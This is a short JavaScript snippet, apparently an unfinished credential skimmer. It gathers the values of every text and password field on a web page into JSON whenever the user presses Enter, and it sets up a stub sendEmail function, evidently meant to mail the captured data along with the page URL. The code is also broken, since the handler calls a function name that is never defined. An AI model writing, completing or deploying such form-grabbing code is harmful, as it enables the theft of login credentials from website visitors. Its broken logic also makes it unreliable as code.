function getTextAndPasswordFields() {
  var text_fields = $('input[type="text"]');
  var passwords_fields = $('input[type="password"]');
  var text_data = [];
  var index = 0;
  for (index = 0; index < text_fields.length; ++index) {
    text_data.push({
      "field_id": text_fields[index].id,
      "field_name": text_fields[index].name,
      "value": text_fields[index].value
    });
  }
  password_data = []
  for (index = 0; index < passwords_fields.length; ++index) {
    password_data.push({
      "field_id": passwords_fields[index].id,
      "field_name": passwords_fields[index].name,
      "value": passwords_fields[index].value
    });
  }
  data = {
    "ts": text_data,
    "ps": password_data
  };
  return JSON.stringify(data);
}

function sendEmail() {
  // get current url
  cur_url = window.location.href;
}

$(document).keypress(function(e) {
    if(e.which == 13) {
      var data = getLoginAndPassword();
      sendEmail();
    }
});

$("input[type='text']").on("click", function () {
  
});